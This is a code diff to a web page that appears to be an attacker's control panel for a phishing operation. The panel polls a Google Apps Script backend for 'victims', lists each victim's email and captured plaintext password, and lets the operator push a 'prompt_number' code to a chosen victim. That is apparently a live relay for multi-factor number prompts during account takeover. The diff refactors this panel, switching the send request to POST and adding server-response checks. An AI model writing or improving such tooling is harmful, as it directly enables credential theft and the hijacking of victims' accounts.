@@ -119,8 +119,8 @@
     const tbodyEl      = document.getElementById('victims-body');
     const lastUpdateEl = document.getElementById('last-update');
 
-    // Store typed values so they survive table re-renders
-    const typedCodes = new Map(); // email → current typed value
+    // Preserve typed codes across refreshes
+    const typedCodes = new Map(); // email → typed value
 
     async function fetchVictims() {
       statusEl.textContent = "Fetching victims...";
@@ -162,17 +162,17 @@
     }
 
     function renderVictims(items) {
-      // Save current typed values before destroying inputs
-      document.querySelectorAll('.code-input').forEach(input => {
-        const val = input.value.trim();
-        if (val) typedCodes.set(input.dataset.email, val);
+      // Save typed values before clearing
+      document.querySelectorAll('.code-input').forEach(inp => {
+        const val = inp.value.trim();
+        if (val) typedCodes.set(inp.dataset.email, val);
       });
 
       tbodyEl.innerHTML = '';
 
       items.forEach(item => {
         const email = item.email;
-        const savedValue = typedCodes.get(email) || '';
+        const saved = typedCodes.get(email) || '';
 
         const tr = document.createElement('tr');
         tr.innerHTML = `
@@ -183,7 +183,7 @@
           <td>${escapeHtml(item.password)}</td>
           <td>
             <input type="text" class="code-input" placeholder="Enter code" 
-                   data-email="${escapeHtml(email)}" value="${escapeHtml(savedValue)}">
+                   data-email="${escapeHtml(email)}" value="${escapeHtml(saved)}">
             <button class="send-btn" data-email="${escapeHtml(email)}">Send</button>
           </td>
         `;
@@ -195,11 +195,9 @@
       statusEl.className = "success";
       lastUpdateEl.textContent = new Date().toLocaleTimeString();
 
-      // Clean up old typed values for victims no longer present
+      // Cleanup old entries
       for (let email of typedCodes.keys()) {
-        if (!items.some(item => item.email === email)) {
-          typedCodes.delete(email);
-        }
+        if (!items.some(i => i.email === email)) typedCodes.delete(email);
       }
     }
 
@@ -214,7 +212,7 @@
       return unsafe.replace(/[&<>"']/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' })[m]);
     }
 
-    // Handle Send button clicks
+    // Send code using POST (matches doPost in GAS)
     document.addEventListener('click', async e => {
       if (!e.target.classList.contains('send-btn')) return;
 
@@ -225,29 +223,35 @@
 
       if (!code) return alert("Enter a code first");
 
-      if (!confirm(`Send code "${code}" to ${email}?`)) return;
+      if (!confirm(`Send "${code}" to ${email}?`)) return;
 
       btn.disabled = true;
       btn.textContent = "Sending...";
 
       try {
-        const params = new URLSearchParams({
-          action: "set_number",
-          email: email,
-          prompt_number: code
+        const formData = new URLSearchParams();
+        formData.append('action', 'set_number');
+        formData.append('email', email);
+        formData.append('prompt_number', code);
+
+        const res = await fetch(SCRIPT_URL, {
+          method: 'POST',
+          body: formData,
+          cache: 'no-cache'
         });
 
-        const res = await fetch(`${SCRIPT_URL}?${params}`, { cache: 'no-cache' });
+        const responseText = await res.text();
 
-        if (res.ok) {
-          alert(`Code "${code}" sent to ${email}`);
+        if (res.ok && (responseText.includes('success":true') || responseText.includes('true'))) {
+          alert(`Code "${code}" sent`);
           input.value = '';
-          typedCodes.delete(email); // forget after successful send
+          typedCodes.delete(email);
         } else {
-          alert("Failed to send (check console)");
+          alert(`Failed – server said: ${responseText || res.status}`);
+          console.log("Server response:", responseText);
         }
       } catch (err) {
-        alert("Error: " + err.message);
+        alert("Send error: " + err.message);
         console.error(err);
       } finally {
         btn.disabled = false;
@@ -255,10 +259,12 @@
       }
     });
 
-    // Start polling
+    // Start
     fetchVictims();
     setInterval(fetchVictims, 5000);
   </script>
 </body>
 </html>
 
+
+  
